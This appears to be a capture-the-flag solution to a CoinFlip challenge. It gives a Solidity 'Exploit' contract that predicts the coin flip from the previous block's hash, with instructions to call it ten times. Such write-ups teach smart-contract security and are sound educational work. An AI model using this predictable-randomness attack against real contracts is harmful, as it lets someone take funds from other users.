Deploy the following contract to the same network

```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.6.0;

  interface CoinFlip {
      function flip(bool) external returns (bool);
  }

contract Exploit {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit(address _who) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(_who).flip(side);
    }
}
```

call exploit() 10 times, making sure to wait enough for a new block
